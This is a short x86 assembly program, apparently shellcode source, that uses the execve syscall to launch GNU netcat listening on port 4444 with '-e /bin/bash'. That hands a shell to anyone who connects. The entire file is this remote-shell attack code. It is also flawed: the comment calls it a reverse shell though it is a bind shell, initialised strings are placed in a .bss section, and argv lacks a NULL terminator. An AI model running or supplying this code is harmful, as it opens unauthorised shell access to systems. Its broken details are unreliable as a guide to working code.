; Create a reverse shell using the GNU netcat binary 
; and execve syscall.

section .text
    global _start

_start:
    mov     eax, 0xB ; syscall int execve(const char *file, char *const argv[], char *const envp[])
    mov     ebx, arg0 ; filename aka /usr/bin/netcat
    mov     ecx, argv ; args
    mov     edx, envp
    int     0x80 ; invoke syscall

    mov     eax, 1
    xor     ebx, ebx
    int     0x80

section .bss:
    arg0    db "/usr/bin/netcat", 0x0
    arg1    db "-lvp", 0x0
    arg2    db "4444", 0x0
    arg3    db "-e", 0x0
    arg4    db "/bin/bash", 0x0
    argv    dd arg0, arg1, arg2, arg3, arg4
    envp    dd 0x0